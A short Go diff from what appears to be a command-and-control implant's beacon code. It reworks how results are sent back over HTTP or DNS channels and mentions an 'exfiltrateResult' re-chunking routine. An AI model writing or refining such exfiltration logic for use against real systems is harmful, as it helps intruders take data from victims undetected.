@@ -779,7 +779,16 @@ func (b *Beacon) sendResultMessage(message string, phase PhaseConfig) (string, e
 		wireMessage := fmt.Sprintf("%s|%s", message, timestamp)
 		return b.transport.Send(operationForMessage(message), wireMessage)
 	default: // "" or "auto"
-		return b.sendControlMessage(message, phase)
+		// Results are sized for the transport that carries them. Falling back to
+		// DNS here would hand an HTTP-sized frame to the DNS client, which cannot
+		// fit a query; the result would look "sent" and never arrive. Try HTTP
+		// only and let exfiltrateResult re-chunk for DNS on failure.
+		if b.transport != nil && b.transport.ShouldUseHTTP() {
+			timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
+			wireMessage := fmt.Sprintf("%s|%s", message, timestamp)
+			return b.transport.Send(operationForMessage(message), wireMessage)
+		}
+		return b.client.sendPhaseCommand(message, phase)
 	}
 }
 
